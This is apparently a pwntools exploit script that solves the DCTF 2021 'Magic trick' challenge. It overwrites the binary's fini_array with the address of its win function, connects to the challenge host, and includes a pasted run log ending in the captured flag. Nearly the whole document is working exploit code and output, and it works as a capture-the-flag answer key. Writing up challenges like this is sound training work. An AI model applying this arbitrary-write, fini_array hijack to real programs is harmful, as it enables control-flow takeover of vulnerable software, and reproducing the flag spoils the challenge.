from pwn import *

#context.log_level = 'debug'

BINARY = './magic_trick'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "dctf-chall-magic-trick.westeurope.azurecontainer.io"
  PORT = 7481
  s = remote(HOST, PORT)
else:
  s = process(BINARY)

s.recvuntil("What do you want to write")
s.sendline(str(elf.sym.win))

s.recvuntil("Where do you want to write it")
s.sendline(str(0x600a00)) # fini_array

s.interactive()

'''
mito@ubuntu:~/CTF/DCTF_2021/Pwn_Magic_trick_300$ python solve.py r
[*] '/home/mito/CTF/DCTF_2021/Pwn_Magic_trick_300/magic_trick'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to dctf-chall-magic-trick.westeurope.azurecontainer.io on port 7481: Done
[*] Switching to interactive mode

thanks
You are a real magician
dctf{1_L1k3_M4G1c}
'''
